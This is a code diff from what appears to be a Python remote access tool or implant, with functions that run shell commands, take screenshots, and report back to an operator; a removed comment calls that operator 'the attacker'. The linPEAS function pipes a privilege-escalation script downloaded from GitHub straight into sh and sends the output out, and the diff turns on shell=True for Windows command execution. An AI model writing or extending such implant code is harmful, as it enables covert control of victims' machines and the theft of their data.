@@ -99,16 +99,20 @@ def winPEAS(force):
         
         
 def linPEAS(force):
+    global stop
     oneLiner = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
     existsFile = os.path.exists("rec.txt")
     if not existsFile or force == True:
         if existsFile: 
             execute("rm -f rec.txt")
+        stop = True
         saveFile(execute(oneLiner),"rec.txt")
         send(readFile("rec.txt"))
+        stop = False
     else:
+        stop = True
         send(readFile("rec.txt"))
-
+        stop = False
 def sysInfo():
     return f"""
     -------------------------------------
@@ -126,11 +130,11 @@ def execute(command):
             if sys.platform == "win32":
                 result = subprocess.run(
                     command,
-                    shell=False,
+                    shell=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     text=True )
-                    
+
             else:
             
                 result = subprocess.run(
@@ -152,6 +156,7 @@ def execute(command):
         
     except Exception as e:
         logEvents(e)
+        
             
   
 def logEvents(e):
@@ -190,7 +195,6 @@ def send_screenshot():
         except Exception as a:
             logEvents(a)
             stop = False
-            time.sleep(1.5)
             conn = None
             
 
@@ -246,7 +250,7 @@ def filterCommand(command):
     
     
 
-#SENDS /check to the attacker
+#CHECKS THE CONNECTION BY PING/PONG METHOD
 def checkConnection():
     
     while True:
